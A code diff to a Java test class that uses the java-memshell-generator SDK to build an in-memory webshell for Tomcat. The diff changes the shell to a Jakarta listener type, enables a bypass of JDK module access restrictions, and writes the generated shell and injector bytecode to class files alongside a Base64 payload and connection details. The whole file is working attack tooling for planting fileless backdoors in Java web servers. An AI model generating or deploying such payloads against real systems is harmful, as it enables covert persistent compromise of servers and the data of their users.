@@ -2,6 +2,7 @@ import jmg.core.config.AbstractConfig;
 import jmg.core.config.Constants;
 import jmg.sdk.jMGenerator;
 import jmg.sdk.util.SDKResultUtil;
+import me.gv7.woodpecker.tools.common.FileUtil;
 
 /*
 1、将 java-memshell-generator 和 jmg-sdk 安装到本地 maven 仓库
@@ -25,7 +26,7 @@ public class SDKTest {
             // 设置中间件 or 框架
             setServerType(Constants.SERVER_TOMCAT);
             // 设置内存马类型
-            setShellType(Constants.SHELL_LISTENER);
+            setShellType(Constants.SHELL_JAKARTA_LISTENER);
             // 设置输出格式为 BASE64
             setOutputFormat(Constants.FORMAT_BASE64);
             // 设置漏洞利用封装，默认不启用
@@ -34,9 +35,15 @@ public class SDKTest {
             build();
         }};
 
+        // 绕过 JDK Module 访问限制
+        config.setEnableBypassJDKModule(true);
         jMGenerator generator = new jMGenerator(config);
         generator.genPayload();
+
+        FileUtil.writeFile("shell.class",config.getShellBytes());
+        FileUtil.writeFile("injector.class",config.getInjectorBytes());
         generator.printPayload();
+
 
         // 连接信息
         SDKResultUtil.printBasicInfo(config);
